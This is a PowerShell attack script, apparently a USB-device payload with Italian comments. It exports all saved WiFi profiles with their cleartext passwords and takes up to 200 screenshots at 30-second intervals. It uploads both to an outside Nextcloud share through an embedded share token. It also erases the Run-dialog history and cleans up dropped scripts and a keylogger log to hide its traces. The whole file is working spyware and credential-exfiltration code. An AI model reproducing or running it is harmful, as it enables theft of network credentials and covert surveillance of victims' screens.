function Nextcloud-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [string]$SourceFilePath
    ) 
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $nextcloudUrl = "https://wim.nl.tabdigital.cloud/"
    $sharetoken = 'gkj9TSrXtzxGrn4'
    
    $fileObject = Get-Item $SourceFilePath
    $headers = @{
        "Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($sharetoken):"))))");
        "X-Requested-With"="XMLHttpRequest";
    }
    $webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"
    Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}

# --- INIZIO BLOCCO DI PROTEZIONE ---
try {
    # 1. Pulizia iniziale record
    cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
    Remove-Item .\RunMRU\ -ErrorAction SilentlyContinue

    # 2. Export WiFi
    $p = "C:\wipass"
    if (!(Test-Path $p)) { mkdir $p }
    cd $p
    netsh wlan export profile key=clear
    dir *.xml | % {
        $xml=[xml](get-content $_)
        $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
        Out-File "$env:computername-wificapture.txt" -Append -InputObject $a
    }

    if (Test-Path "$env:computername-wificapture.txt") {
        "$env:computername-wificapture.txt" | Nextcloud-Upload
    }

    # 3. Ciclo Screenshots
    $i = 0
    while($i -lt 200){
        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
        $screens = [Windows.Forms.Screen]::AllScreens
        $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
        $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
        $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
        $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

        $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
        $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

        $currentPath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png"
        $bmp.Save($currentPath)
        $graphics.Dispose()
        $bmp.Dispose()
      
        if (Test-Path $currentPath) {
            $currentPath | Nextcloud-Upload
        }
        
        $i++
        Start-Sleep -Seconds 30
    }
}
finally {
    # --- QUESTO CODICE VIENE ESEGUITO SEMPRE ALLA FINE ---
    # Anche se premi CTRL+C o se lo script crasha
    
    Write-Host "Esecuzione pulizia finale di sicurezza..." -ForegroundColor Yellow

    $paths = @(
        "$env:APPDATA\c.ps1", 
        "$env:APPDATA\sg.ps1", 
        "$env:APPDATA\sg2.ps1", 
        "C:\Users\Irene\Desktop\OMG\testing\temp.txt", 
        "$env:temp\keylogger.txt", 
        "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png",
        "C:\wipass\*"
    )

    foreach($filePath in $paths) {
        if (Test-Path $filePath) {
            Remove-Item $filePath -Force -Recurse -Verbose -ErrorAction SilentlyContinue
        }
    }
    
    # Rimuove la cartella wipass se vuota
    if (Test-Path "C:\wipass") {
        Remove-Item "C:\wipass" -Force -Recurse -ErrorAction SilentlyContinue
    }
}
